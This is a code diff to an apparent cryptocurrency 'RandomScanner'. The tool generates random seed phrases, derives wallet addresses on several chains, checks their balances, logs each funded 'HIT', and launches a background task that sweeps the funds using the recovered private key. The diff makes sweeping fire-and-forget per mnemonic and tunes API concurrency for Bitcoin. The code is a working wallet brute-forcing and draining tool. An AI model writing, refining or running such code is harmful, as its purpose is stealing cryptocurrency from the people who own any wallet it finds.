@@ -77,6 +77,7 @@ class RandomScanner:
         self.chains = chains or list(ALL_CHAINS)
         self.hit_logger = hit_logger
         self._api_semaphore = asyncio.Semaphore(api_concurrency)
+        self._btc_semaphore = asyncio.Semaphore(5)  # BTC gets lower concurrency (free APIs are rate-limited)
         self._shutdown = False
         self._stats = ScannerStats()
         self._client: Optional[httpx.AsyncClient] = None  # shared HTTP client
@@ -242,51 +243,43 @@ class RandomScanner:
 
         return self._stats
 
-    # Accumulate N mnemonics' addresses before batch-checking (~7*N addresses)
-    _BATCH_SIZE = 5
 
     async def _worker(self, worker_id: int, stop_event: asyncio.Event) -> None:
-        """Batched worker — accumulates addresses across mnemonics, checks in bulk."""
+        """Single mnemonic worker with fire-and-forget sweep."""
         while not stop_event.is_set() and not self._shutdown:
             try:
-                batch_addrs: list[DerivedAddress] = []
-                batch_mnemonic_map: dict[str, str] = {}  # addr -> mnemonic
-                loop = asyncio.get_running_loop()
-
-                for _ in range(self._BATCH_SIZE):
-                    if stop_event.is_set() or self._shutdown:
-                        break
-                    mnemonic = self._generate_mnemonic()
-                    if mnemonic in self._seen_mnemonics:
-                        continue
-                    self._seen_mnemonics.add(mnemonic)
-                    addresses = await loop.run_in_executor(None, derive_from_mnemonic, mnemonic, self.chains)
-                    self._stats.mnemonics_generated += 1
-                    for addr in addresses:
-                        if addr.address not in self._seen_addresses:
-                            self._seen_addresses.add(addr.address)
-                            batch_addrs.append(addr)
-                            batch_mnemonic_map[addr.address] = mnemonic
-
-                if not batch_addrs:
+                mnemonic = self._generate_mnemonic()
+                if mnemonic in self._seen_mnemonics:
                     continue
+                self._seen_mnemonics.add(mnemonic)
+
+                loop = asyncio.get_running_loop()
+                addresses = await loop.run_in_executor(None, derive_from_mnemonic, mnemonic, self.chains)
+                self._stats.mnemonics_generated += 1
 
                 if self._stats.mnemonics_generated % 1000 == 0:
                     self._save_persistent_stats()
 
-                # Batch-check all accumulated addresses at once
-                balance_results = await self._check_balances(batch_addrs)
-                self._stats.addresses_checked += len(batch_addrs)
+                if not addresses:
+                    continue
 
-                for addr, balance_result in zip(batch_addrs, balance_results):
+                new_addresses = [a for a in addresses if a.address not in self._seen_addresses]
+                for a in new_addresses:
+                    self._seen_addresses.add(a.address)
+                if not new_addresses:
+                    continue
+
+                balance_results = await self._check_balances(new_addresses)
+                self._stats.addresses_checked += len(new_addresses)
+
+                for addr, balance_result in zip(new_addresses, balance_results):
                     if balance_result is not None and balance_result.balance > 0:
                         self._stats.hits_found += 1
                         logger.warning("HIT! %s: %.8f %s at %s", addr.chain, balance_result.balance, addr.symbol, addr.address)
                         if addr.private_key_hex:
                             asyncio.create_task(self._sweep_hit(addr, balance_result))
                         if self.hit_logger:
-                            mnemonic_hash = HitLogger.hash_mnemonic(batch_mnemonic_map.get(addr.address, ""))
-                            await self.hit_logger.log_hit(address=addr.address, chain=addr.chain, balance=balance_result.balance, usd_value=balance_result.usd_value, mnemonic_hash=mnemonic_hash, derivation_path=addr.derivation_path, source="random_scan")
+                            await self.hit_logger.log_hit(address=addr.address, chain=addr.chain, balance=balance_result.balance, usd_value=balance_result.usd_value, mnemonic_hash=HitLogger.hash_mnemonic(mnemonic), derivation_path=addr.derivation_path, source="random_scan")
 
                 await asyncio.sleep(0)
 
